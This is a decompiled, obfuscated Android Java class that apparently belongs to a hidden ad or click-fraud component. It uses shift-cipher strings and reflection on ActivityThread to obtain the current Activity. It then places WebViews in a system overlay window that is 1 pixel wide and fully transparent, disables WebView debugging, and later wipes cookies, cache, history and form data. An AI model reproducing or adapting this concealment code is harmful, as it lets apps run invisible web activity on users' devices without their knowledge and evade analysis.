package com.a.b.a;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.os.Message;
import android.util.ArrayMap;
import android.util.DisplayMetrics;
import android.view.View;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/* loaded from: classes.dex */
public final class ad {
    private FrameLayout a;
    private int b = 0;
    private int c = 0;
    private WindowManager d;
    private WindowManager.LayoutParams e;
    private Context f;

    private static Activity d() {
        Map map;
        try {
            Class<?> cls = Class.forName(aq.a("ivlzwql6ixx6Ik|q~q|\u0081\\pzmil", 8));
            Object invoke = cls.getMethod(aq.a("fxuuhqwDfwlylw|Wkuhdg", 3), new Class[0]).invoke(null, new Object[0]);
            Field declaredField = cls.getDeclaredField(aq.a("oCevkxkvkgu", 2));
            declaredField.setAccessible(true);
            map = Build.VERSION.SDK_INT < 19 ? (HashMap) declaredField.get(invoke) : (ArrayMap) declaredField.get(invoke);
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (map.size() <= 0) {
            return null;
        }
        for (Object obj : map.values()) {
            Class<?> cls2 = obj.getClass();
            Field declaredField2 = cls2.getDeclaredField(aq.a("wh|zlk", 7));
            declaredField2.setAccessible(true);
            if (!declaredField2.getBoolean(obj)) {
                Field declaredField3 = cls2.getDeclaredField(aq.a("bdujwjuz", 1));
                declaredField3.setAccessible(true);
                return (Activity) declaredField3.get(obj);
            }
        }
        return null;
    }

    public final WebView a() {
        WebView a = af.a(this.f);
        a.setLayoutParams(new FrameLayout.LayoutParams(this.b, this.c));
        this.a.addView(a);
        return a;
    }

    public final void a(Context context, int i, boolean z) {
        boolean z2;
        this.f = context.getApplicationContext();
        if (this.a == null) {
            DisplayMetrics displayMetrics = context.getResources().getDisplayMetrics();
            this.b = displayMetrics.widthPixels;
            this.c = displayMetrics.heightPixels;
            int identifier = context.getResources().getIdentifier(aq.a("xyfyzxdgfwdmjnlmy", 5), aq.a("lqumv", 8), aq.a("kxn|ysn", 10));
            this.c -= identifier > 0 ? context.getResources().getDimensionPixelSize(identifier) : 0;
            if (this.b == 0) {
                this.b = 1080;
                this.c = 1920;
            }
            if (this.c < this.b) {
                int i2 = this.c;
                this.c = this.b;
                this.b = i2;
            }
            this.a = new FrameLayout(context);
            this.a.setLayoutParams(new LinearLayout.LayoutParams(-1, -1));
            if (ba.a) {
                z = true;
            } else {
                WebView.setWebContentsDebuggingEnabled(false);
            }
            Activity d = d();
            if (d != null) {
                this.d = d.getWindowManager();
                aq.a("cuqc", 2);
                aq.a("hfu!bdujwjuz!tvddftt", 1);
                z2 = true;
            } else {
                this.d = (WindowManager) context.getSystemService(aq.a("|nsit|", 5));
                z2 = false;
            }
            this.e = new WindowManager.LayoutParams();
            if (z2) {
                this.e.type = 2;
            } else {
                this.e.type = 2038;
            }
            this.e.format = 1;
            this.e.x = 0;
            this.e.y = 0;
            this.e.screenOrientation = -1;
            this.e.gravity = 85;
            this.e.format = -3;
            if (z) {
                this.e.width = this.b;
                this.e.height = this.c;
                this.e.alpha = 10.0f;
                this.e.flags = 16777216;
            } else {
                this.e.width = 1;
                this.e.height = 1;
                this.e.alpha = 0.0f;
                this.e.flags = 16777784;
            }
            try {
                this.d.addView(this.a, this.e);
            } catch (Throwable th) {
            }
            m a = m.a();
            ae aeVar = new ae(this);
            Message message = new Message();
            Bundle bundle = new Bundle();
            bundle.putSerializable(m.a, aeVar);
            message.setData(bundle);
            message.what = 2;
            a.sendMessageDelayed(message, i * 1000);
        }
    }

    public final void b() {
        if (this.d == null || this.a == null) {
            return;
        }
        try {
            this.d.removeViewImmediate(this.a);
            int childCount = this.a.getChildCount();
            for (int i = 0; i < childCount; i++) {
                View childAt = this.a.getChildAt(i);
                if (childAt instanceof WebView) {
                    WebView webView = (WebView) childAt;
                    if (Build.VERSION.SDK_INT >= 26) {
                        WebViewClient webViewClient = webView.getWebViewClient();
                        if (webViewClient instanceof w) {
                            ((w) webViewClient).a().a();
                        }
                    }
                    CookieManager.getInstance().removeAllCookie();
                    webView.clearCache(true);
                    webView.clearHistory();
                    webView.clearFormData();
                    webView.destroy();
                }
            }
            this.a.removeAllViews();
            this.a = null;
        } catch (Exception e) {
        }
    }

    public final boolean c() {
        return this.a == null;
    }
}
